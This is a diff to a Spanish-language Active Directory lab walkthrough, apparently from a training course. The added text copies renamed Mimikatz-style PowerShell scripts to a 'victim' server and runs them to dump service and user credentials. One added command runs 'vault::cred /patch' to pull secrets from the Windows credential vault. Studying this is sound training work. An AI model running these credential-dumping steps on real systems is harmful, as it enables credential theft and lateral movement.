@@ -563,5 +563,20 @@ Copy-Item C:\AD\Tools\Invoke-TheKatEx-keys-std97.ps1 \\dcorp-adminsrv.dollarcorp
 
 Navegaremos a la ruta donde lo hemos copiado y lo ejecutaremos
 ```shell
-.\Invoke
+.\Invoke-TheKatEx-keys-std97.ps1
+```
+
+A la hora de haberlo ejecutado encontraremos las credenciales de los usuarios dcorp-adminsrv$, appadmin y websvc
+
+También se pueden buscar credenciales en el almacén de credenciales de *Windows*
+Vamos a crear el nuevo *Invoke-TheKat* le llamaremos de la siguiente forma: *Invoke-TheKatEx-vault-std97.ps1*
+Primero tendremos que crear una copia del  *Invoke-TheKat* original y cambiarle el nombre a *Invoke-TheKatEx-vault-std97.ps1*
+Tendremos que modificar el archivo y añadir en la ultima linea
+```shell
+Invoke-TheKat -Command '"token::evasive-elevate" "vault::cred /patch"'
+```
+
+Lo volvemos a copiar en la maquina victima y lo ejecutamos
+```shell
+Copy-Item C:\AD\Tools\Invoke-TheKatEX-vault-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
 ```
